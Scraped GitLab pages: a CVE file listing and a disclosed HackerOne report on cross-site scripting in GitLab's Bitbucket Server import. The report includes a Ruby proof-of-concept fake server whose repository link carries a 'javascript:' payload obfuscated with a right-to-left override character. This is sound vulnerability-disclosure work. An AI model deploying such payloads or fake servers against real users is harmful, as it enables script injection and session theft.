=== Content from gitlab.com_9927f561_20250119_111841.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2020](/gitlab-org/cves/-/tree/master/2020)
* [**CVE-2020-13330.json**](/gitlab-org/cves/-/blob/master/2020/CVE-2020-13330.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2020/CVE-2020-13330.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2020/CVE-2020-13330.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![🤖 GitLab Bot 🤖's avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 "🤖 GitLab Bot 🤖")](/gitlab-bot)

  Sep 29, 2020

  [3cd61cef](/gitlab-org/cves/-/commit/3cd61cef95d94f20a2d40adbb0e6dd5e84047909)
  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/3cd61cef95d94f20a2d40adbb0e6dd5e84047909)
  ·
  3cd61cef

  [🤖 GitLab Bot 🤖](/gitlab-bot) authored Sep 29, 2020

  3cd61cef

  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/3cd61cef95d94f20a2d40adbb0e6dd5e84047909)
  [🤖 GitLab Bot 🤖](/gitlab-bot) authored Sep 29, 2020

Loading



=== Content from gitlab.com_e954b735_20250119_111842.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Cross-Site Scripting In BitbucketServer Import

**[HackerOne report #638698](https://hackerone.com/reports/638698)** by `nyangawa` on 2019-07-10, assigned to `estrike`:

### Summary

The `BitbucketServerImport::Importer` of GitLab trusts the response from a (maybe-malicious) Bitbucket server without sanitizing links of repositories. An attacker could set up a fake Bitbucket server and ask the victim to try to import repositories from it, the XSS payload could be triggered by the victim when he checks the links of the candidate repositories.

### Steps to reproduce

1. Select "New Project" > "Import Project" > "Bitbucket Server"
2. Fill the form, with "<http://bitbucket.nyangawa.me:4567>" in URL field, and random username/password.

   [![Screen_Shot_2019-07-10_at_1.47.49_PM.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/b8d4b2205a921d6d0d2ec7da90d450c1569004ca/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f35633966316363652d323038652d346134612d613364662d3135656339336330306166382f53637265656e5f53686f745f323031392d30372d31305f61745f312e34372e34395f504d2e706e67)
3. Click the link of the first repository.

   [![Screen_Shot_2019-07-10_at_1.50.08_PM.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/6a7c51ea576bfaefe5c9346ecbee32ad0192e0c3/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f39323464626538642d333538352d343437312d626664642d6264656663373966333563652f53637265656e5f53686f745f323031392d30372d31305f61745f312e35302e30385f504d2e706e67)

#### Description

the source code of the PoC server is like:

```
get '/rest/api/1.0/repos' do
  content_type :json
  repos_resp
end

def repos_resp
{
    "size": 1,
    "limit": 25,
    "isLastPage": true,
    "values": [
        {
            "slug": "\"",
            "id": 1,
            "name": "My repo",
            "description": "My repo description",
            "scmId": "git",
            "state": "AVAILABLE",
            "statusMessage": "Available",
            "forkable": true,
            "project": {
                "key": "PROJECT",
                "id": 1,
                "name": "My Cool Project",
                "description": "The description for my cool project.",
                "public": true,
                "type": "NORMAL",
                "links": {
                    "self": [
                        {
                            "href": "http://link/to/project"
                        }
                    ]
                }
            },
            "public": true,
            "links": {
                "clone": [
                    {
                        "href": "ssh://git@<baseURL>/PRJ/my-repo.git",
                        "name": "ssh"
                    },
                    {
                        "href": "https://<baseURL>/scm/PRJ/my-repo.git",
                        "name": "http"
                    }
                ],
                "self": [
                    {
                        "href": "jAvAsCrIpT:\"Click HERE!!\u202e\";alert(document.domain)"
                    }
                ]
            }
        }
    ],
    "start": 0
}.to_json
end
```

`\u202e` in the link is used as an example of a possible obfuscation trick.

#### Results of GitLab environment info

I tested this on `gitlab.com`

## Impact

It's a common XSS attacking vector, and user interactions are required to complete the attack. The attacker could use some obfuscation tricks to hide the real purpose of the payload. However, it's easy for users with caution to protect themselves from being attacked. So I think the impact is low.

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [Screen\_Shot\_2019-07-10\_at\_1.47.49\_PM.png](https://h1.sec.gitlab.net/a/5c9f1cce-208e-4a4a-a3df-15ec93c00af8/Screen_Shot_2019-07-10_at_1.47.49_PM.png)
* [Screen\_Shot\_2019-07-10\_at\_1.50.08\_PM.png](https://h1.sec.gitlab.net/a/924dbe8d-3585-4471-bfdd-bdefc79f35ce/Screen_Shot_2019-07-10_at_1.50.08_PM.png)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


